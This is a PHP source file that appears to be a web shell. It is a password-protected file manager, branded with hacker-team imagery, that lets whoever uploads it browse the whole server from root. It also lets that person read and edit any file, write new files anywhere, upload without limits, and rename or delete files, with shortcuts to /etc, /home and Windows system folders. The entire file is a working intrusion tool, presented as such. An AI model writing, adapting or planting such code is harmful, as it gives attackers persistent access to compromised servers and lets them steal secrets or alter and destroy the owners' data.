<?php
session_start();
$pass = "SeniDariByte";

// Login check
if (!isset($_SESSION["login"])) {
    if (isset($_POST["p"]) && $_POST["p"] === $pass) {
        $_SESSION["login"] = 1;
        header("Location: ?");
        exit;
    }
    
    echo '<!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Login</title>
    </head>
    <body style="margin:0;background:#000;color:#fff;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh">
        <div style="text-align:center">
            <img src="https://raw.githubusercontent.com/AlvaXPloit/ISI/refs/heads/main/alvaror.png" alt="TRASER SEC TEAM" style="width:300px;max-width:90%">
            <form method="post" style="margin-top:20px">
                <input type="password" name="p" placeholder="Password" style="padding:10px;border:none;border-radius:5px;background:#111;color:#0f0;width:200px">
                <button style="padding:10px 15px;margin-left:5px;border:none;border-radius:5px;background:#0f0;color:#000">Login</button>
            </form>
        </div>
    </body>
    </html>';
    exit;
}

// NO PATH RESTRICTIONS - FULL ACCESS
$path = isset($_GET["d"]) ? $_GET["d"] : getcwd();

// Convert to absolute path if relative
if (!empty($path) && $path[0] !== '/') {
    $path = getcwd() . '/' . $path;
}

// Ensure path exists
if (!file_exists($path)) {
    $path = getcwd();
}

// Logout
if (isset($_GET["logout"])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// Delete file
if (isset($_GET["del"])) {
    $delPath = $_GET["del"];
    if (file_exists($delPath) && is_file($delPath)) {
        @unlink($delPath);
    }
    header("Location: ?d=" . urlencode($path));
    exit;
}

// Create new folder
if (isset($_POST["newfolder"]) && !empty(trim($_POST["newfolder"]))) {
    $folderName = trim($_POST["newfolder"]);
    if ($folderName) {
        @mkdir($path . "/" . $folderName, 0755, true);
    }
    header("Location: ?d=" . urlencode($path));
    exit;
}

// File upload
if (isset($_POST["upload"])) {
    if (isset($_FILES["file"]) && $_FILES["file"]["error"] == UPLOAD_ERR_OK) {
        $tmp = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $target = $path . "/" . $name;
        
        if (is_uploaded_file($tmp)) {
            // NO SIZE LIMITS
            move_uploaded_file($tmp, $target);
        }
    }
    header("Location: ?d=" . urlencode($path));
    exit;
}

// Edit file
if (isset($_POST["editfile"])) {
    $filePath = $_POST["file"];
    $content = $_POST["content"];
    
    // Direct file write - NO RESTRICTIONS
    if (file_exists($filePath) || !file_exists(dirname($filePath))) {
        file_put_contents($filePath, $content);
    }
    header("Location: ?d=" . urlencode($path));
    exit;
}

// Rename file
if (isset($_GET["r"]) && isset($_GET["new"])) {
    $oldPath = $_GET["r"];
    $newName = $_GET["new"];
    
    if (file_exists($oldPath) && !empty($newName)) {
        $newPath = dirname($oldPath) . "/" . $newName;
        rename($oldPath, $newPath);
    }
    header("Location: ?d=" . urlencode($path));
    exit;
}

// HTML Interface
echo '<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Manager - UNRESTRICTED</title>
    <style>
        body { margin:0; background:#000; color:#fff; font-family:monospace; }
        .header { background:#111; padding:10px; position:sticky; top:0; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; }
        a { color:#0f0; text-decoration:none; }
        .btn { background:#0f0; color:#000; border:none; padding:7px 12px; border-radius:5px; cursor:pointer; }
        .btn-danger { background:#f33; color:#fff; }
        .btn-warning { background:#ff0; color:#000; }
        input, textarea { background:#111; color:#0f0; border:none; padding:8px; border-radius:5px; width:100%; box-sizing:border-box; }
        .card { background:#111; margin:5px 0; padding:10px; border-radius:8px; }
        table { width:100%; border-collapse:collapse; }
        td { padding:8px; border-bottom:1px solid #222; vertical-align:top; }
        tr:hover { background:#1a1a1a; }
        .path { color:#0af; word-break:break-all; }
        .file-size { color:#aaa; font-size:0.9em; }
        .actions { white-space:nowrap; }
        .warning { background:#330; color:#ff0; padding:10px; border-radius:5px; margin-bottom:10px; border:1px solid #ff0; }
        
        @media (max-width: 600px) {
            .header { flex-direction:column; align-items:flex-start; }
            .actions { margin-top:5px; }
            .actions a, .actions form { display:block; margin-bottom:5px; }
            table { font-size:0.9em; }
        }
    </style>
</head>
<body>';

echo '<div class="header">
    <div class="path">📂 Directory: ' . htmlspecialchars($path) . '</div>
    <div>
        <a href="?d=/" class="btn-warning" style="margin-right:10px">Root (/)</a>
        <a href="?d=' . urlencode(getcwd()) . '" class="btn" style="margin-right:10px">Current Dir</a>
        <a href="?logout=1" class="btn-danger">Logout</a>
    </div>
</div>';

echo '<div style="padding:10px">';

// Warning message
echo '<div class="warning">⚠️ WARNING: UNRESTRICTED FILE ACCESS - Path traversal allowed!</div>';

// Manual path navigation
echo '<form method="get" class="card">
    <input type="text" name="d" placeholder="Enter absolute path (e.g., /etc, /var, C:\\)" value="' . htmlspecialchars($path) . '">
    <button class="btn" style="margin-top:5px">Go to Path</button>
</form>';

// Upload form
echo '<form method="post" enctype="multipart/form-data" class="card">
    <input type="file" name="file" required>
    <button name="upload" class="btn" style="margin-top:5px">Upload File (NO LIMITS)</button>
</form>';

// Create folder form
echo '<form method="post" class="card">
    <input name="newfolder" placeholder="New Folder Name" required>
    <button class="btn" style="margin-top:5px">Create Folder</button>
</form>';

// Edit file section
if (isset($_GET["edit"])) {
    $editPath = $_GET["edit"];
    
    // Try to read file
    $content = '';
    $error = '';
    
    if (file_exists($editPath) && is_file($editPath)) {
        if (is_readable($editPath)) {
            $content = htmlspecialchars(file_get_contents($editPath), ENT_QUOTES, 'UTF-8');
        } else {
            $error = 'File exists but is not readable!';
        }
    } else {
        // Allow creating new files anywhere
        $error = 'File doesn\'t exist. Will create new file at: ' . htmlspecialchars($editPath);
    }
    
    echo '<div class="card">
        <h3>📝 Editing: ' . htmlspecialchars($editPath) . '</h3>';
    
    if ($error) {
        echo '<div class="warning">' . $error . '</div>';
    }
    
    echo '<form method="post">
        <input type="hidden" name="file" value="' . htmlspecialchars($editPath) . '">
        <textarea name="content" style="height:70vh; font-family:monospace;">' . $content . '</textarea>
        <div style="margin-top:10px">
            <button name="editfile" class="btn">Save Changes</button>
            <a href="?d=' . urlencode($path) . '" class="btn btn-danger">Cancel</a>
        </div>
    </form>
    </div>';
    
    echo '</div></body></html>';
    exit;
}

// File listing
echo '<div class="card">';
echo '<table>';

// Root and parent directory links
echo '<tr>
    <td colspan="2">
        <a href="?d=/" class="btn-warning" style="padding:5px 10px;font-size:0.9em">📍 Root (/)</a>';
if ($path !== "/" && $path !== "") {
    $parent = dirname($path);
    echo '<a href="?d=' . urlencode($parent) . '" class="btn" style="padding:5px 10px;font-size:0.9em;margin-left:5px">⬆️ Parent Directory</a>';
}
echo '</td></tr>';

// Scan directory
if (is_dir($path) && is_readable($path)) {
    $files = @scandir($path);
    if ($files === false) {
        echo '<tr><td colspan="2" style="color:#f33;">❌ Cannot read directory (permission denied?)</td></tr>';
    } else {
        foreach ($files as $f) {
            if ($f == "." || $f == "..") continue;
            
            $fullPath = $path . "/" . $f;
            $isDir = is_dir($fullPath);
            
            echo '<tr>';
            
            // Name column
            echo '<td>';
            if ($isDir) {
                echo '📁 <a href="?d=' . urlencode($fullPath) . '">' . htmlspecialchars($f) . '</a>';
            } else {
                echo '📄 <a href="?d=' . urlencode($path) . '&edit=' . urlencode($fullPath) . '">' . htmlspecialchars($f) . '</a>';
                if (file_exists($fullPath)) {
                    echo '<div class="file-size">' . formatSize(filesize($fullPath)) . ' | ' . date("Y-m-d H:i:s", filemtime($fullPath)) . '</div>';
                }
            }
            echo '</td>';
            
            // Actions column
            echo '<td class="actions" style="text-align:right">';
            if (!$isDir) {
                // Delete link
                echo '<a href="?d=' . urlencode($path) . '&del=' . urlencode($fullPath) . '" onclick="return confirm(\'Delete this file?\')" style="color:#f33;margin-right:10px">🗑️ Delete</a>';
                
                // Rename form
                echo '<form method="get" style="display:inline-block">
                    <input type="hidden" name="d" value="' . htmlspecialchars($path) . '">
                    <input type="hidden" name="r" value="' . htmlspecialchars($fullPath) . '">
                    <input name="new" placeholder="New name" value="' . htmlspecialchars($f) . '" style="width:150px;display:inline-block">
                    <button class="btn" type="submit">✏️ Rename</button>
                </form>';
            } else {
                echo '<a href="?d=' . urlencode($fullPath) . '" class="btn">📂 Open</a>';
            }
            echo '</td>';
            
            echo '</tr>';
        }
    }
} else {
    echo '<tr><td colspan="2" style="color:#f33;">❌ Not a directory or permission denied: ' . htmlspecialchars($path) . '</td></tr>';
}

echo '</table>';
echo '</div>';

// Quick jump to common directories
echo '<div class="card">
    <h4>Quick Jump:</h4>
    <div style="display:flex;flex-wrap:wrap;gap:5px;">
        <a href="?d=/" class="btn">/ (Root)</a>
        <a href="?d=/etc" class="btn">/etc</a>
        <a href="?d=/var" class="btn">/var</a>
        <a href="?d=/tmp" class="btn">/tmp</a>
        <a href="?d=/home" class="btn">/home</a>
        <a href="?d=/usr" class="btn">/usr</a>';
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    echo '<a href="?d=C:\\" class="btn">C:\\</a>';
    echo '<a href="?d=C:\\Windows" class="btn">C:\\Windows</a>';
    echo '<a href="?d=C:\\Users" class="btn">C:\\Users</a>';
}
echo '</div></div>';

echo '</div></body></html>';

// Helper function to format file size
function formatSize($bytes) {
    if ($bytes == 0) return "0 B";
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}
?>